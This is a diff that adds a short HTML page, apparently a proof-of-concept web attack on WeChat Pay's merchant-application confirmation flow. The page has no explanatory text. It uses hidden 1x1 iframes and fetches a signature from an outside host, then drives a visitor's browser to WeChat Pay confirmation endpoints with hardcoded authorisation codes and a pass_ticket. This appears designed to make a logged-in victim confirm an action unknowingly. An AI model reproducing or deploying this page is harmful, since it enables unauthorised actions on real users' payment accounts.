@@ -1,0 +1,12 @@
+<iframe id="x" width="1" height="1" onload="pwn()" src=''></iframe>
+<iframe id="y" width="1" height="1" src=''></iframe>
+<script>
+sig=''
+fetch("https://1vpctucm.cs4.pw/paypay").then(res => res.text()).then(res => sig=res);
+
+  x.src='https://pay.weixin.qq.com/index.php/apply/applyment_home/confirmQrcode?actionType=1&sign='+sig+'&src=&code=081AHF000ytzaM1CiQ200VDz222AHF0D&state=';
+  function pwn()
+  {
+    location='https://pay.weixin.qq.com/index.php/apply/applyment_home/preConfirmQrcode?actionType=2&sign='+sig+'&src=&code=091AMO2w37OFNW27pC2w3hUkjP3AMO2T&state=&pass_ticket=pSnO4A%2FnyPBDOg5VFbLuLknU8yLS0WBQDyPCvOP%2BkoMjgdAHSGWo%2FbAUXWIKA2jL&employeeId=undefined';
+  }
+</script>
